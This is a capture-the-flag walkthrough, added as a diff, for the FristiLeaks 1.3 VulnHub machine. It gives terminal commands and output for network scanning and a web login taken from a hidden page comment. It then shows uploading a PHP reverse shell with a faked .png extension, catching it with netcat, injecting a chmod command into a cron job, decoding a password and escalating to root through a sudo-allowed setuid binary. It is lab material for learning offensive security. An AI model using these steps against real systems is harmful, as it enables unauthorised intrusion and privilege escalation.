@@ -1,0 +1,437 @@
+URL : https://www.vulnhub.com/entry/fristileaks-13,133/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.186.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+                                                                                                                                                                                                                  
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:e9:67:44    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.135 08:00:27:a5:a6:76    01    060   CADMUS COMPUTER SYSTEMS                                                                                                                                         
+ 192.168.174.254 00:50:56:f8:97:d7    01    060   VMWare, Inc.
+ 
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A 192.168.174.135
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-27 15:42 EST
+Nmap scan report for 192.168.174.135
+Host is up (0.00036s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Cadmus Computer Systems)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.36 ms 192.168.174.135
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 159.75 seconds
+root@kali:~# 
+
+3.) Enumerate port 80/tcp - http - Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+In Browser
+http://192.168.174.135/
+KEEP CALM AND DRINK FRISTI
+http://192.168.174.135/fristi/
+In page source:
+Comments
+<!-- 
+TODO:
+We need to clean this up for production. I left some junk in here to make testing easier.
+
+- by eezeepz
+-->
+<!-- 
+iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
+S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
+B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
+m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
+Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
+DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
+jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
+12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
+uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
+04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
+i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
+tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
+30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
+3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
+ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
+mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
+rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
+EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
+AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
+CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
+U5ErkJggg==
+-->
+
+Remove line breaks
+iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==
+
+Decode the string to image
+root@kali:~# echo 'iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==' | base64 -d > hint_1.png
+root@kali:~# 
+
+http://192.168.174.135/fristi/
+username -> eezeepz 
+password -> keKkeKKeKKeKkEkkEk
+http://192.168.174.135/fristi/login_success.php
+upload file
+php-reverse-shell.php.png
+Uploading, please wait
+The file has been uploaded to /uploads 
+http://192.168.174.135/fristi/uploads/php-reverse-shell.php.png
+
+In Terminal (Kali)
+root@kali:~# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.174.137] from (UNKNOWN) [192.168.174.135] 56456
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 21:33:49 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.1$ whoami	
+whoami 
+apache
+sh-4.1$ ls -lah
+ls -lah
+total 102K
+dr-xr-xr-x.  22 root root 4.0K Jan 27 21:10 .
+dr-xr-xr-x.  22 root root 4.0K Jan 27 21:10 ..
+-rw-r--r--    1 root root    0 Jan 27 21:10 .autofsck
+-rw-r--r--    1 root root    0 Nov 17 12:03 .autorelabel
+dr-xr-xr-x.   2 root root 4.0K Nov 17 03:28 bin
+dr-xr-xr-x.   5 root root 1.0K Nov 17 03:27 boot
+drwxr-xr-x   18 root root 3.6K Jan 27 21:10 dev
+drwxr-xr-x.  70 root root 4.0K Jan 27 21:10 etc
+drwxr-xr-x.   5 root root 4.0K Nov 19 01:40 home
+dr-xr-xr-x.   8 root root 4.0K Nov 17 05:34 lib
+dr-xr-xr-x.   9 root root  12K Nov 17 08:52 lib64
+drwx------.   2 root root  16K Nov 17 03:13 lost+found
+drwxr-xr-x.   2 root root 4.0K Sep 23  2011 media
+drwxr-xr-x.   3 root root 4.0K Nov 17 05:35 mnt
+drwxr-xr-x.   3 root root 4.0K Nov 17 05:36 opt
+dr-xr-xr-x  121 root root    0 Jan 27 21:10 proc
+dr-xr-x---.   3 root root 4.0K Nov 25 04:09 root
+dr-xr-xr-x.   2 root root  12K Nov 18 15:56 sbin
+drwxr-xr-x.   2 root root 4.0K Nov 17 03:13 selinux
+drwxr-xr-x.   2 root root 4.0K Sep 23  2011 srv
+drwxr-xr-x   13 root root    0 Jan 27 21:10 sys
+drwxrwxrwt.   3 root root 4.0K Jan 27 21:32 tmp
+drwxr-xr-x.  13 root root 4.0K Nov 17 03:13 usr
+drwxr-xr-x.  19 root root 4.0K Nov 19 01:41 var
+sh-4.1$ cd home
+cd home
+sh-4.1$ ls -lah
+ls -lah
+total 28K
+drwxr-xr-x.  5 root      root      4.0K Nov 19 01:40 .
+dr-xr-xr-x. 22 root      root      4.0K Jan 27 21:10 ..
+drwx------.  2 admin     admin     4.0K Nov 19 02:03 admin
+drwx---r-x.  5 eezeepz   eezeepz    12K Nov 18 15:35 eezeepz
+drwx------   2 fristigod fristigod 4.0K Nov 19 01:40 fristigod
+sh-4.1$ cd eezeepz
+cd eezeepz
+sh-4.1$ ls -lah
+ls -lah
+total 2.6M
+drwx---r-x. 5 eezeepz eezeepz  12K Nov 18 15:35 .
+drwxr-xr-x. 5 root    root    4.0K Nov 19 01:40 ..
+drwxrwxr-x. 2 eezeepz eezeepz 4.0K Nov 17 09:40 .Old
+-rw-r--r--. 1 eezeepz eezeepz   18 Sep 22 12:40 .bash_logout
+-rw-r--r--. 1 eezeepz eezeepz  176 Sep 22 12:40 .bash_profile
+-rw-r--r--. 1 eezeepz eezeepz  124 Sep 22 12:40 .bashrc
+drwxrwxr-x. 2 eezeepz eezeepz 4.0K Nov 17 09:40 .gnome
+drwxrwxr-x. 2 eezeepz eezeepz 4.0K Nov 17 09:40 .settings
+-rwxr-xr-x. 1 eezeepz eezeepz  24K Nov 17 09:49 MAKEDEV
+-rwxr-xr-x. 1 eezeepz eezeepz  33K Nov 17 09:49 cbq
+-rwxr-xr-x. 1 eezeepz eezeepz 6.9K Nov 17 09:49 cciss_id
+-rwxr-xr-x. 1 eezeepz eezeepz  56K Nov 17 09:49 cfdisk
+-rwxr-xr-x. 1 eezeepz eezeepz  25K Nov 17 09:49 chcpu
+-rwxr-xr-x. 1 eezeepz eezeepz  52K Nov 17 09:48 chgrp
+-rwxr-xr-x. 1 eezeepz eezeepz  32K Nov 17 09:49 chkconfig
+-rwxr-xr-x. 1 eezeepz eezeepz  48K Nov 17 09:48 chmod
+-rwxr-xr-x. 1 eezeepz eezeepz  53K Nov 17 09:48 chown
+-rwxr-xr-x. 1 eezeepz eezeepz  44K Nov 17 09:49 clock
+-rwxr-xr-x. 1 eezeepz eezeepz 4.7K Nov 17 09:49 consoletype
+-rwxr-xr-x. 1 eezeepz eezeepz 127K Nov 17 09:48 cpio
+-rwxr-xr-x. 1 eezeepz eezeepz  38K Nov 17 09:49 cryptsetup
+-rwxr-xr-x. 1 eezeepz eezeepz 5.3K Nov 17 09:49 ctrlaltdel
+-rwxr-xr-x. 1 eezeepz eezeepz  41K Nov 17 09:48 cut
+-rwxr-xr-x. 1 eezeepz eezeepz  15K Nov 17 09:49 halt
+-rwxr-xr-x. 1 eezeepz eezeepz  14K Nov 17 09:49 hostname
+-rwxr-xr-x. 1 eezeepz eezeepz  44K Nov 17 09:49 hwclock
+-rwxr-xr-x. 1 eezeepz eezeepz 7.8K Nov 17 09:49 kbd_mode
+-rwxr-xr-x. 1 eezeepz eezeepz  12K Nov 17 09:49 kill
+-rwxr-xr-x. 1 eezeepz eezeepz  17K Nov 17 09:49 killall5
+-rwxr-xr-x. 1 eezeepz eezeepz  33K Nov 17 09:49 kpartx
+-rwxr-xr-x. 1 eezeepz eezeepz  12K Nov 17 09:49 nameif
+-rwxr-xr-x. 1 eezeepz eezeepz 168K Nov 17 09:49 nano
+-rwxr-xr-x. 1 eezeepz eezeepz 5.4K Nov 17 09:49 netreport
+-rwxr-xr-x. 1 eezeepz eezeepz 121K Nov 17 09:49 netstat
+-rwxr-xr-x. 1 eezeepz eezeepz  14K Nov 17 09:49 new-kernel-pkg
+-rwxr-xr-x. 1 eezeepz eezeepz  25K Nov 17 09:49 nice
+-rwxr-xr-x. 1 eezeepz eezeepz  14K Nov 17 09:49 nisdomainname
+-rwxr-xr-x. 1 eezeepz eezeepz 4.7K Nov 17 09:49 nologin
+-r--r--r--. 1 eezeepz eezeepz  514 Nov 18 14:53 notes.txt
+-rwxr-xr-x. 1 eezeepz eezeepz 382K Nov 17 09:49 tar
+-rwxr-xr-x. 1 eezeepz eezeepz  12K Nov 17 09:49 taskset
+-rwxr-xr-x. 1 eezeepz eezeepz 244K Nov 17 09:49 tc
+-rwxr-xr-x. 1 eezeepz eezeepz  51K Nov 17 09:49 telinit
+-rwxr-xr-x. 1 eezeepz eezeepz  47K Nov 17 09:49 touch
+-rwxr-xr-x. 1 eezeepz eezeepz  12K Nov 17 09:49 tracepath
+-rwxr-xr-x. 1 eezeepz eezeepz  13K Nov 17 09:49 tracepath6
+-rwxr-xr-x. 1 eezeepz eezeepz  21K Nov 17 09:49 true
+-rwxr-xr-x. 1 eezeepz eezeepz  35K Nov 17 09:49 tune2fs
+-rwxr-xr-x. 1 eezeepz eezeepz  16K Nov 17 09:49 weak-modules
+-rwxr-xr-x. 1 eezeepz eezeepz  12K Nov 17 09:49 wipefs
+-rwxr-xr-x. 1 eezeepz eezeepz 493K Nov 17 09:49 xfs_repair
+-rwxr-xr-x. 1 eezeepz eezeepz  14K Nov 17 09:49 ypdomainname
+-rwxr-xr-x. 1 eezeepz eezeepz   62 Nov 17 09:49 zcat
+-rwxr-xr-x. 1 eezeepz eezeepz  47K Nov 17 09:47 zic
+sh-4.1$ cat notes.txt
+cat notes.txt
+Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+sh-4.1$ cd /home/admin
+cd /home/admin
+sh: cd: /home/admin: Permission denied
+sh-4.1$ echo "/usr/bin/../../bin/chmod -R 777 /home/admin" > /tmp/runthis
+echo "/usr/bin/../../bin/chmod -R 777 /home/admin" > /tmp/runthis
+sh-4.1$ cd /home/admin
+cd /home/admin
+sh: cd: /home/admin: Permission denied
+sh-4.1$ cd /tmp
+cd /tmp
+sh-4.1$ ls -lah
+ls -lah
+total 20K
+drwxrwxrwt.  3 root   root   4.0K Jan 27 21:40 .
+dr-xr-xr-x. 22 root   root   4.0K Jan 27 21:10 ..
+drwxrwxrwt   2 root   root   4.0K Jan 27 21:10 .ICE-unix
+-rw-r--r--   1 admin  admin   110 Jan 27 21:41 cronresult
+-rw-rw-rw-   1 apache apache   44 Jan 27 21:39 runthis
+sh-4.1$ cat cronresult
+cat cronresult
+executing: /usr/bin/../../bin/chmod -R 777 /home/admin
+executing: /usr/bin/../../bin/chmod -R 777 /home/admin
+sh-4.1$ ls -lah /home
+ls -lah /home
+total 28K
+drwxr-xr-x.  5 root      root      4.0K Nov 19 01:40 .
+dr-xr-xr-x. 22 root      root      4.0K Jan 27 21:10 ..
+drwxrwxrwx.  2 admin     admin     4.0K Nov 19 02:03 admin
+drwx---r-x.  5 eezeepz   eezeepz    12K Nov 18 15:35 eezeepz
+drwx------   2 fristigod fristigod 4.0K Nov 19 01:40 fristigod
+sh-4.1$ ls -lah /home/admin
+ls -lah /home/admin
+total 652K
+drwxrwxrwx. 2 admin     admin     4.0K Nov 19 02:03 .
+drwxr-xr-x. 5 root      root      4.0K Nov 19 01:40 ..
+-rwxrwxrwx. 1 admin     admin       18 Sep 22 12:40 .bash_logout
+-rwxrwxrwx. 1 admin     admin      176 Sep 22 12:40 .bash_profile
+-rwxrwxrwx. 1 admin     admin      124 Sep 22 12:40 .bashrc
+-rwxrwxrwx  1 admin     admin      45K Nov 18 13:42 cat
+-rwxrwxrwx  1 admin     admin      48K Nov 18 14:14 chmod
+-rwxrwxrwx  1 admin     admin      737 Nov 18 14:48 cronjob.py
+-rwxrwxrwx  1 admin     admin       21 Nov 18 15:21 cryptedpass.txt
+-rwxrwxrwx  1 admin     admin      258 Nov 18 15:20 cryptpass.py
+-rwxrwxrwx  1 admin     admin      89K Nov 18 13:49 df
+-rwxrwxrwx  1 admin     admin      24K Nov 18 13:40 echo
+-rwxrwxrwx  1 admin     admin     160K Nov 18 13:42 egrep
+-rwxrwxrwx  1 admin     admin     160K Nov 18 13:42 grep
+-rwxrwxrwx  1 admin     admin      84K Nov 18 13:41 ps
+-rw-r--r--  1 fristigod fristigod   25 Nov 19 01:47 whoisyourgodnow.txt
+
+sh-4.1$ cat /home/admin/cryptpass.py
+cat /home/admin/cryptpass.py
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+The above script is performing base64 encoding, reversing the string and performing a ROT13 shift operation 
+
+sh-4.1$ cat /home/admin/whoisyourgodnow.txt
+cat /home/admin/whoisyourgodnow.txt
+=RFn0AKnlMHMPIzpyuTI0ITG
+
+Reversing cryptpass.py operations
+root@kali:~# python
+Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import base64,codecs
+>>> base64.b64decode( codecs.encode('=RFn0AKnlMHMPIzpyuTI0ITG', 'rot13')[::-1] )
+'LetThereBeFristi!'
+>>> 
+
+4.) Switch user to fristigod
+sh-4.1$ python -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+sh-4.1$ su - fristigod
+su - fristigod
+Password: LetThereBeFristi!
+
+-bash-4.1$ id
+id
+uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
+-bash-4.1$ cd /var/fristigod
+cd /var/fristigod
+-bash-4.1$ ls
+ls
+-bash-4.1$ ls -lah
+ls -lah
+total 16K
+drwxr-x---   3 fristigod fristigod 4.0K Nov 25 05:55 .
+drwxr-xr-x. 19 root      root      4.0K Nov 19 01:41 ..
+-rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4.0K Nov 25 05:53 .secret_admin_stuff
+-bash-4.1$ cat .bash_history
+cat .bash_history
+ls
+pwd
+ls -lah
+cd .secret_admin_stuff/
+ls
+./doCom 
+./doCom test
+sudo ls
+exit
+cd .secret_admin_stuff/
+ls
+./doCom 
+sudo -u fristi ./doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+sudo /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo /var/fristigod/.secret_admin_stuff/doCom
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+groups
+ls -lah
+usermod -G fristigod fristi
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+less /var/log/secure e
+Fexit
+exit
+exit
+-bash-4.1$ cd .secret_admin_stuff
+cd .secret_admin_stuff
+-bash-4.1$ ls -lah
+ls -lah
+total 16K
+drwxrwxr-x. 2 fristigod fristigod 4.0K Nov 25 05:53 .
+drwxr-x---  3 fristigod fristigod 4.0K Nov 25 05:55 ..
+-rwsr-sr-x  1 root      root      7.4K Nov 25 05:53 doCom
+-bash           
+
+-bash-4.1$ ./doCom
+./doCom
+Nice try, but wrong user ;)
+
+5.) Check the permissions fristigod has
+-bash-4.1$ sudo -l
+sudo -l
+[sudo] password for fristigod: LetThereBeFristi!
+
+Matching Defaults entries for fristigod on this host:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User fristigod may run the following commands on this host:
+    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
+    
+
+6.) Run doCom as user "fristi"
+-bash-4.1$ sudo -u fristi ./.secret_admin_stuff/doCom
+sudo -u fristi ./.secret_admin_stuff/doCom
+Usage: ./program_name terminal_command ...
+-bash-4.1$ 
+
+-bash-4.1$ sudo -u fristi .secret_admin_stuff/doCom /bin/bash
+sudo -u fristi .secret_admin_stuff/doCom /bin/bash
+bash-4.1# id
+id
+uid=0(root) gid=100(users) groups=100(users),502(fristigod)
+bash-4.1# cd /root
+cd /root
+bash-4.1# ls -lah
+ls -lah
+total 48K
+dr-xr-x---.  3 root root 4.0K Nov 25 04:09 .
+dr-xr-xr-x. 22 root root 4.0K Jan 27 21:10 ..
+-rw-------   1 root root 1.9K Nov 25 06:10 .bash_history
+-rw-r--r--.  1 root root   18 May 20  2009 .bash_logout
+-rw-r--r--.  1 root root  176 May 20  2009 .bash_profile
+-rw-r--r--.  1 root root  176 Sep 22  2004 .bashrc
+drwxr-xr-x.  3 root root 4.0K Nov 25 05:53 .c
+-rw-r--r--.  1 root root  100 Sep 22  2004 .cshrc
+-rw-------.  1 root root  246 Nov 17 12:19 fristileaks_secrets.txt
+-rw-------.  1 root root 1.3K Nov 17 06:51 .mysql_history
+-rw-r--r--.  1 root root  129 Dec  3  2004 .tcshrc
+-rw-------.  1 root root  829 Nov 17 09:17 .viminfo
+bash-4.1# cat fristileaks_secrets.txt
+cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+
+bash-4.1#
